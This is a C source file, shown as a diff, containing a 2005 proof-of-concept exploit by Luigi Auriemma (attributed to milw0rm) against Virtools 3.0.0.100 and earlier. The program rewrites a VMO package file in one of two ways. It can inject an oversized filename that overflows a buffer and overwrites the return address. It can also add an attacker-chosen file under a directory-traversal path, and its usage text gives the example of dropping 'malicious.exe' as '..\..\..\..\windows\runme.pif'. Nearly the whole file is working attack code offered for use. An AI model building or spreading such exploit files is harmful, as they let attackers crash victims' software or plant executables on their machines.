@@ -1,0 +1,234 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+
+#ifdef WIN32
+    #include <io.h>
+
+    typedef unsigned char   u_char;
+    typedef unsigned int    u_int;
+    #define ftruncate   chsize
+#else
+    #include <unistd.h>
+    #include <sys/types.h>
+#endif
+
+
+
+#define VER     "0.1"
+#define SIGN    "Nemo"
+#define FILE1   "components"
+#define FILE2   "objects"
+#define FMT     "%-10u"
+#define EIP     "\xde\xc0\xad\xde"
+#define BOF     "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                "aa" EIP
+#define BOFFILE "Nemo il pesce scemo"
+
+
+
+u_int putfile(FILE *fdout, char *fname);
+void std_err(void);
+
+
+
+struct {
+    u_char  sign[4];
+    u_int   unknown1;   // 0x694620
+    u_int   crc;        // ???
+    u_int   unknown2;   // big-endian sdk version?
+    u_int   plugin1;
+    u_int   plugin2;
+    u_int   unknown3;   // 12
+    u_int   compcsz;
+    u_int   objcsz;
+    u_int   objsz;
+    u_int   addpath;    // ???
+    u_int   components;
+    u_int   objects;
+    u_int   zero;       // ???
+    u_int   version;
+    u_int   compsz;
+} vmo;
+
+
+
+int main(int argc, char *argv[]) {
+    FILE    *fd;
+    u_int   i,
+            len,
+            off;
+    int     attack;
+    u_char  fname[512],
+            *vmofile,
+            *addfile,
+            *addpath;
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Virtools <= 3.0.0.100 buffer-overflow and directory traversal bugs "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <file.VMO>\n"
+            "\n"
+            "Attack:\n"
+            " 1 = buffer-overflow\n"
+            " 2 = directory traversal, is needed to specify also the file to add and the\n"
+            "     special path for exploiting the bug\n"
+            "\n"
+            "Example: virtbugs 1 tintoys.vmo\n"
+            "Example: virtbugs 2 tintoys.vmo malicious.exe ..\\..\\..\\..\\windows\\runme.pif\n"
+            "Note:    will be replaced only the latest file in the package\n"
+            "Note:    if you need a quick VMO file use the following:\n"
+            "           http://www.virtools.com/downloads/vmo/Tintoys/tintoys.vmo"
+            "\n", argv[0]);
+        exit(1);
+    }
+
+    attack  = atoi(argv[1]);
+    vmofile = argv[2];
+
+    if((attack != 1) && (attack != 2)) {
+        fputs("\nError: wrong attack number chosen\n\n", stdout);
+        exit(1);
+    }
+
+    printf("- open VMO file:    %s\n", vmofile);
+    fd = fopen(vmofile, "r+b");
+    if(!fd) std_err();
+
+    if(!fread(&vmo, sizeof(vmo), 1, fd)) std_err();
+    off = ftell(fd);
+
+    if(memcmp(vmo.sign, SIGN, sizeof(vmo.sign))) {
+        printf("- file seems invalid, its sign is: %.*s\n",
+            sizeof(vmo.sign), vmo.sign);
+    }
+
+    printf(
+        "  Informations and files list:\n"
+        "- components:       %u\n"
+        "- objects:          %u\n"
+        "- version:          %hhu.%hhu.%hhu.%hhu\n"
+        "\n",
+        vmo.components,
+        vmo.objects,
+        (vmo.version >> 24) & 0xff, (vmo.version >> 16) & 0xff,
+        (vmo.version >> 8)  & 0xff, vmo.version & 0xff);
+
+    fputs(
+        "  inSize     outSize    Filename\n"
+        "  ------------------------------\n", stdout);
+
+    printf("  "FMT" "FMT" %s\n", vmo.compcsz, vmo.compsz, FILE1);
+    printf("  "FMT" "FMT" %s\n", vmo.objcsz,  vmo.objsz,  FILE2);
+    if(fseek(fd, off + vmo.compcsz + vmo.objcsz, SEEK_SET) < 0) std_err();
+
+    for(i = 2; ; i++) {
+        if(!fread(&len, 4, 1, fd)) break;
+        off = ftell(fd) - 4;
+        if(!fread(fname, len, 1, fd)) break;
+
+        if(len > (sizeof(fname) - 1)) break; // checks
+        fname[len] = 0;
+        if(!*fname) break;
+
+        if(!fread(&len, 4, 1, fd)) break;
+        printf("             "FMT" %s\n", len, fname);
+
+        if(fseek(fd, len, SEEK_CUR) < 0) std_err();
+    }
+
+    if(i <= 2) {
+        fputs("\n"
+            "Error: your VMO file doesn't contain additional files so cannot be modified\n"
+            "       try with another\n"
+            "\n", stdout);
+        exit(1);
+    }
+
+    fseek(fd, off, SEEK_SET);
+
+    if(attack == 1) {
+        fputs("\n- buffer-overflow bug exploitation\n", stdout);
+        len = sizeof(BOF) - 1;
+        fwrite(&len, 4, 1, fd);
+        fwrite(BOF, len, 1, fd);
+
+        len = sizeof(BOFFILE) - 1;
+        fwrite(&len, 4, 1, fd);
+        fwrite(BOFFILE, len, 1, fd);
+
+    } else if(attack == 2) {
+        fputs("\n- directory traversal bug exploitation\n", stdout);
+        if(argc < 5) {
+            fputs("\nError: you must specify also <your_file> and <bad_path>\n\n", stdout);
+            exit(1);
+        }
+        addfile = argv[3];
+        addpath = argv[4];
+
+        len = strlen(addpath);
+        fwrite(&len, 4, 1, fd);
+        fwrite(addpath, len, 1, fd);
+
+        len = putfile(fd, addfile);
+    }
+
+    fflush(fd);
+    if(ftruncate(fileno(fd), ftell(fd)) < 0) std_err();
+    fflush(fd);
+    fclose(fd);
+    printf("- added a file of %u bytes\n", len);
+    return(0);
+}
+
+
+
+u_int putfile(FILE *fdout, char *fname) {
+    struct stat xstat;
+    FILE    *fdin;
+    u_int   len,
+            tot = 0;
+    u_char  buff[1024];
+
+    fdin = fopen(fname, "rb");
+    if(!fdin) std_err();
+    fstat(fileno(fdin), &xstat);
+
+    fwrite(&xstat.st_size, 4, 1, fdout);
+
+    while((len = fread(buff, 1, sizeof(buff), fdin))) {
+        fwrite(buff, len, 1, fdout);
+        tot += len;
+    }
+
+    fclose(fdin);
+    return(tot);
+}
+
+
+
+void std_err(void) {
+    perror("\nError");
+    exit(1);
+}
+
+// milw0rm.com [2005-10-02]
